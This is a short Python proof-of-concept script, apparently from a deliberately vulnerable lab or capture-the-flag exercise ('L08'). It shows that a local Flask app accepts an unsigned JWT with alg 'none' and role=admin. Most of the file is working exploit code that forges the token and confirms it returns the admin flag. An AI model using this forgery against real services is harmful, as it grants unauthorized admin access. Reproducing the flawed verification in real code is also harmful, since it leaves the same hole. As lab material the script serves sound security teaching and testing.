"""L08 JWT algorithm-confusion PoC.

verify() only checks the HMAC when alg == "HS256". Any other alg value
(here "none") skips verification, so a self-made token with role=admin is
accepted on the admin route.
"""
import base64
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import load_level, ok

mod, _, _ = load_level("L08")
client = mod.app.test_client()


def b64url(obj):
    return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b"=").decode()


# legitimate low-privilege login still works
tok = client.post("/login", json={"username": "alice", "password": "pw-alice"}).get_json()["token"]
r_user = client.get("/admin", headers={"Authorization": "Bearer " + tok})
ok(r_user.status_code == 403, "genuine user token is correctly denied admin")

# forged unsigned token with alg=none and role=admin
forged = b64url({"alg": "none", "typ": "JWT"}) + "." + b64url({"sub": "x", "role": "admin"}) + "."
r_admin = client.get("/admin", headers={"Authorization": "Bearer " + forged})
ok(r_admin.status_code == 200, "forged alg=none token granted admin access")
ok("flag" in r_admin.get_data(as_text=True), "admin secret returned to forged token")
print("L08 exploit confirmed")
